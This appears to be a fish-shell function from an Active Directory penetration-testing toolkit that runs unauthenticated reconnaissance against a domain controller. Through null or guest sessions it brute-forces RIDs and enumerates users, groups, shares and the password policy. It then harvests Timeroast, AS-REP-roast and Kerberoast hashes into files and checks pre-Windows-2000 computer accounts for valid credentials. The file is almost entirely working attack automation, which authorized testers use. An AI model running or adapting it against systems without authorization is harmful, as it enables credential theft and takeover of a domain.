# Return success if a null/guest session can read something useful.
function __ezpz_enumnull_has_data --argument-names target user pass
    set -l shares (timeout 30 nxc smb $target -u "$user" -p "$pass" --shares --smb-timeout 25 2>/dev/null)
    if string match -qr '(READ|WRITE|NO ACCESS)' -- $shares
        return 0
    end

    set -l users (timeout 30 nxc smb $target -u "$user" -p "$pass" --rid-brute 100 2>/dev/null)
    if string match -qr 'SidTypeUser' -- $users
        return 0
    end

    # SAMR user enumeration and the password policy can work even when shares,
    # RID brute force and LDAP are denied.
    set -l passpol (timeout 30 nxc smb $target -u "$user" -p "$pass" --pass-pol 2>/dev/null)
    if string match -qr 'Minimum password length' -- $passpol
        return 0
    end

    set -l users (timeout 30 nxc smb $target -u "$user" -p "$pass" --users 2>/dev/null)
    if printf '%s\n' $users | grep -aqE '^[^[]*[A-Za-z0-9._$-]+[[:space:]]+\['
        return 0
    end

    set -l groups (timeout 30 nxc ldap $target -u "$user" -p "$pass" --groups 2>/dev/null)
    if string match -qr 'membercount|Administrators|Domain Admins' -- $groups
        return 0
    end

    return 1
end

function _ezpz_enumnull
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    ezpz_banner enumnull

    # Usage message
    set usage "
Usage: ezpz enumnull -t <target> [--guest] [-k]

Performs initial reconnaissance on a target without credentials (null session).

  -t, --target    Target IP or hostname (Required)
  --guest         Use guest account with empty password instead of null session
  -k, --kerb      Use Kerberos authentication (requires a valid TGT)
  -h, --help      Show this help message

Examples:
ezpz enumnull -t 10.10.10.10
ezpz enumnull -t dc01.corp.local --guest
ezpz enumnull -t dc01.corp.local --guest -k
"

    # Check required tools
    if not command -v nxc >/dev/null 2>&1
        ezpz_error "Required tool not found: nxc"
        return 1
    end

    # Parse arguments
    argparse 't/target=' 'guest' 'k/kerb' 'h/help' -- $argv
    or begin
        ezpz_error "Invalid arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 0
    end

    # Check required arguments
    if not set -q _flag_target
        ezpz_error "Missing required argument: -t/--target"
        echo $usage
        return 1
    end

    set target $_flag_target
    
    # Set credentials based on --guest flag. Without the flag, start with a
    # null session and only fall back to guest when null returns nothing.
    if set -q _flag_guest
        set auth_user "guest"
        set auth_pass ""
        set auth_desc "guest account"
    else
        set auth_user ""
        set auth_pass ""
        set auth_desc "null session"

        ezpz_spin __ezpz_enumnull_has_data $target "" ""
        if test $status -ne 0
            ezpz_warn "Null session returned no data. Trying guest account..."
            ezpz_spin __ezpz_enumnull_has_data $target "guest" ""
            if test $status -eq 0
                set auth_user "guest"
                set auth_desc "guest account (null session returned nothing)"
            else
                ezpz_warn "Guest account also returned no data (disabled or access denied)."
            end
        end
    end

    # Extract DC FQDN from /etc/hosts if needed for Kerberos
    set dc_fqdn ""
    if set -q _flag_kerb
        set dc_fqdn (awk -v target="$target" '$1 == target {max_len=0; fqdn=""; for(i=2; i<=NF; i++) {if(length($i) > max_len) {max_len=length($i); fqdn=$i}} print fqdn; exit}' /etc/hosts)
        if test -n "$dc_fqdn"
            # For Kerberos, use FQDN instead of IP
            set target $dc_fqdn
        else
            ezpz_warn "DC FQDN not found in /etc/hosts for $_flag_target. Kerberos may fail."
        end
        
        # Time synchronization for Kerberos
        if command -v ntpdate >/dev/null 2>&1
            ezpz_info "Synchronizing clock with DC for Kerberos authentication..."
            sudo systemctl stop systemd-timesyncd
            sudo ntpdate -u $_flag_target >/dev/null 2>&1
        else
            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
        end
    end

    # Create temporary files
    set users_tmp (mktemp)
    set users_temp (mktemp)
    trap 'rm -f "$users_tmp" "$users_temp"' EXIT TERM INT

    ezpz_title "Starting enumeration on $target using $auth_desc..."

    # Extract domain first (fast)
    set -l domain_tmp (mktemp)
    ezpz_spin_capture $domain_tmp timeout 60 nxc smb $target
    set -l domain_rc $status
    set domain (grep -a 'domain:' $domain_tmp | head -1 | sed -n 's/.*domain:\([^)]*\).*/\1/p')
    rm -f $domain_tmp
    if test $domain_rc -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end
    
    # Set users file name based on extracted domain
    set users_file "$target"_users.txt
    set users_file_mini "$target"_users-mini.txt
    if test -n "$domain"
        set users_file "$domain"_users.txt
        set users_file_mini "$domain"_users-mini.txt
    end

    # Build nxc command arguments
    set nxc_args $target -u "$auth_user" -p "$auth_pass"
    if set -q _flag_kerb
        ezpz_kerberos_check ldap; or return 1
        set -a nxc_args -k
        if set -q KRB5CCNAME
            set -a nxc_args --use-kcache
        end
    end

    # User Enumeration - prioritize --rid-brute over --users
    ezpz_header "Enumerating users with RID Bruteforcing"
    ezpz_cmd nxc smb $nxc_args --rid-brute 10000
    ezpz_spin nxc smb $nxc_args --rid-brute 10000 | grep -a 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
    
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    else if test -s $users_tmp
        cp $users_tmp $users_file
        ezpz_info "Saving enumerated users to $users_file"
    else
        printf '%s\n' "No users found with RID bruteforcing."
        ezpz_info "Trying --users as fallback..."
        
        # Fallback to --users
        ezpz_header "Enumerating users (fallback)"
        ezpz_cmd nxc smb $nxc_args --users
        ezpz_spin nxc smb $nxc_args --users | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
        
        if test $pipestatus[1] -eq 124
            ezpz_warn "Operation timed out. Skipping."
        else if test -s $users_temp
            # Extract just usernames and save to file with -mini suffix
            cat $users_temp | awk '{print $1}' > $users_tmp
            cp $users_tmp $users_file_mini
            ezpz_info "Saving enumerated users to $users_file_mini"
        else
            printf '%s\n' "No users found."
        end
    end

    # Groups
    ezpz_header "Enumerating groups"
    ezpz_cmd nxc ldap $nxc_args --groups
    set -l groups_tmp (mktemp)
    ezpz_spin_capture $groups_tmp timeout 60 nxc ldap $nxc_args --groups
    set groups_status $status
    set groups_out (cat $groups_tmp)
    rm -f $groups_tmp
    if test $groups_status -eq 124
        ezpz_warn "Operation timed out. Skipping."
    else
        set -l groups_rendered
        if string match -q '*membercount*' -- $groups_out
            # Older nxc output format
            set groups_rendered (printf '%s\n' $groups_out | grep -a 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -av 'membercount: 0' | sed "s/membercount:/-/g")
        else
            # nxc >= 1.5 renders an aligned Group/Members/Description table
            set groups_rendered (printf '%s\n' $groups_out | grep -avF -e '[*]' -e '[+]' -e '[-]' -e '[!]' | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//')
        end

        set -l groups_data (printf '%s\n' $groups_rendered | grep -avE '^-Group-[[:space:]]')
        if test -n "$groups_data"
            printf '%s\n' $groups_rendered
        else
            printf '%s\n' "No groups found (access denied?)."
        end
    end

    # Password Policy
    ezpz_header "Enumerating password policy"
    ezpz_cmd nxc smb $nxc_args --pass-pol
    set -l passpol_tmp (mktemp)
    ezpz_spin_capture $passpol_tmp timeout 60 nxc smb $nxc_args --pass-pol
    set passpol_status $status
    set passpol_out (cat $passpol_tmp)
    rm -f $passpol_tmp
    if test $passpol_status -eq 124
        ezpz_warn "Operation timed out. Skipping."
    else
        set -l passpol_rendered (printf '%s\n' $passpol_out | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-)
        if test -n "$passpol_rendered"
            printf '%s\n' $passpol_rendered
        else
            printf '%s\n' "No password policy found (access denied?)."
        end
    end

    # Shares Enumeration
    ezpz_header "Enumerating shares"
    ezpz_cmd nxc smb $nxc_args --shares --smb-timeout 999
    set shares_output (mktemp)
    ezpz_spin timeout 60 nxc smb $nxc_args --shares --smb-timeout 999 | grep -aE "READ|WRITE|NO ACCESS" | tr -s " " | cut -d " " -f 5- > $shares_output
    set shares_status $pipestatus[1]
    
    if test $shares_status -eq 124
        ezpz_warn "Operation timed out. Skipping."
    else if test -s $shares_output
        # Format shares as table using READ/WRITE as delimiter
        printf "%-20s %-15s %s\n" "SHARE NAME" "PERMISSIONS" "DESCRIPTION"
        printf "%-20s %-15s %s\n" "----------" "-----------" "-----------"
        cat $shares_output | awk '
        {
            line = $0
            if (match(line, /READ,WRITE/)) {
                share = substr(line, 1, RSTART-1)
                perm = "READ,WRITE"
                desc = substr(line, RSTART+10)
            } else if (match(line, /READ/)) {
                share = substr(line, 1, RSTART-1)
                perm = "READ"
                desc = substr(line, RSTART+5)
            } else if (match(line, /WRITE/)) {
                share = substr(line, 1, RSTART-1)
                perm = "WRITE"
                desc = substr(line, RSTART+6)
            } else if (match(line, /NO ACCESS/)) {
                share = substr(line, 1, RSTART-1)
                perm = "NO ACCESS"
                desc = substr(line, RSTART+9)
            }
            gsub(/^[ \t]+|[ \t]+$/, "", share)
            gsub(/^[ \t]+|[ \t]+$/, "", desc)
            printf "%-20s %-15s %s\n", share, perm, desc
        }'
    else
        printf '%s\n' "No shares found (access denied?)."
    end
    
    # Cleanup temp file
    rm -f $shares_output

    ezpz_title "Looking for exploitable accounts..."

    # Timeroast - works without authentication
    ezpz_header "Searching for Timeroastable accounts"
    set time_file "$target"_time.hash
    if test -n "$domain"
        set time_file "$domain"_time.hash
    end
    ezpz_cmd "nxc smb $_flag_target -M timeroast"
    ezpz_spin nxc smb $_flag_target -M timeroast | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5 | tee $time_file
    if test -s $time_file
        ezpz_info "Saving hashes to $time_file"
    else
        rm -f $time_file
        printf '%s\n' "No Timeroastable accounts found."
    end

    # Test for exploitable accounts if user files exist
    set users_file_full "$target"_users.txt
    set users_file_mini "$target"_users-mini.txt
    if test -n "$domain"
        set users_file_full "$domain"_users.txt
        set users_file_mini "$domain"_users-mini.txt
    end

    set active_users_file ""
    if test -f $users_file_full
        set active_users_file $users_file_full
    else if test -f $users_file_mini
        set active_users_file $users_file_mini
    end

    if test -n "$active_users_file"
        ezpz_header "Searching for AS-REProastable accounts"
        set asrep_file "$target"_asrep.hash
        if test -n "$domain"
            set asrep_file "$domain"_asrep.hash
        end

        # Build GetNPUsers command for null session
        set getnpusers_cmd GetNPUsers.py "$domain/" -usersfile "$active_users_file" -dc-ip "$_flag_target" -no-pass -request
        if set -q _flag_kerb -a -n "$dc_fqdn"
            set -a getnpusers_cmd -k -dc-host "$dc_fqdn"
        end
        
        ezpz_cmd "$getnpusers_cmd"
        set -l asrep_tmp (mktemp)
        ezpz_spin_capture $asrep_tmp $getnpusers_cmd
        set output (cat $asrep_tmp)
        rm -f $asrep_tmp
        set hash_lines (printf '%s\n' $output | grep -a '^\$krb5asrep\$')
        
        # Show and save hash lines if found
        if test -n "$hash_lines"
            for hash in $hash_lines
                echo $hash
            end
            printf '%s\n' $hash_lines > $asrep_file
            ezpz_info "Saving hashes to $asrep_file"
            
            # Extract first AS-REP roastable user for Kerberoasting
            set asrep_user (printf '%s\n' $hash_lines[1] | grep -aoE '\$[^@]+@[^:]+' | cut -d'@' -f1 | cut -d'$' -f4)
            if test -n "$asrep_user"
                ezpz_header "Searching for Kerberoastable accounts using AS-REP user"
                set kerb_file "$target"_kerb.hash
                if test -n "$domain"
                    set kerb_file "$domain"_kerb.hash
                end
                
                set getuserspns_cmd GetUserSPNs.py "$domain/" -no-preauth "$asrep_user" -usersfile "$active_users_file" -dc-ip "$_flag_target" -no-pass -request
                if set -q _flag_kerb -a -n "$dc_fqdn"
                    set -a getuserspns_cmd -k -dc-host "$dc_fqdn"
                end
                
                ezpz_cmd "$getuserspns_cmd"
                set -l spn_tmp (mktemp)
                ezpz_spin_capture $spn_tmp $getuserspns_cmd
                set spn_output (cat $spn_tmp)
                rm -f $spn_tmp
                set spn_hash_lines (printf '%s\n' $spn_output | grep -a '^\$krb5tgs\$')
                
                # Show and save hash lines if found
                if test -n "$spn_hash_lines"
                    # Convert hashes to user:hash format
                    printf '%s\n' $spn_hash_lines | sed -E 's/\$krb5tgs\$23\$\*([^$]+)\$.*$/\1:&/' | tee $kerb_file
                    ezpz_info "Saving hashes to $kerb_file"
                else
                    printf '%s\n' "No Kerberoastable accounts found."
                end
            end
        else
            printf '%s\n' "No AS-REP roastable accounts found."
        end

        # Test pre2k only if we have the full users file (not mini)
        if test "$active_users_file" = "$users_file_full" -a -s "$active_users_file"
            if command -v pre2k >/dev/null 2>&1
                ezpz_header "Searching for pre-Win2k compatible computer accounts (NoPac)"
                
                # Build pre2k command
                if set -q _flag_kerb -a -n "$dc_fqdn"
                    set pre2k_cmd pre2k unauth -d "$domain" -dc-host "$dc_fqdn" -dc-ip "$_flag_target" -inputfile "$active_users_file" -k
                    if set -q KRB5CCNAME
                        set -a pre2k_cmd -no-pass
                    end
                else
                    set pre2k_cmd pre2k unauth -d "$domain" -dc-ip "$_flag_target" -inputfile "$active_users_file"
                end
                
                ezpz_cmd "$pre2k_cmd"
                set -l pre2k_tmp (mktemp)
                ezpz_spin_capture $pre2k_tmp $pre2k_cmd
                set -l pre2k_out (grep -aioE "VALID CREDENTIALS: .*" --color=never $pre2k_tmp)
                rm -f $pre2k_tmp
                if test -n "$pre2k_out"
                    printf '%s\n' $pre2k_out
                else
                    printf '%s\n' "No pre-Win2k compatible computer accounts found."
                end
            else
                ezpz_warn "pre2k not found. Skipping pre-Win2k computer account enumeration."
            end
        end
    end

    echo
    ezpz_success "Done."
end
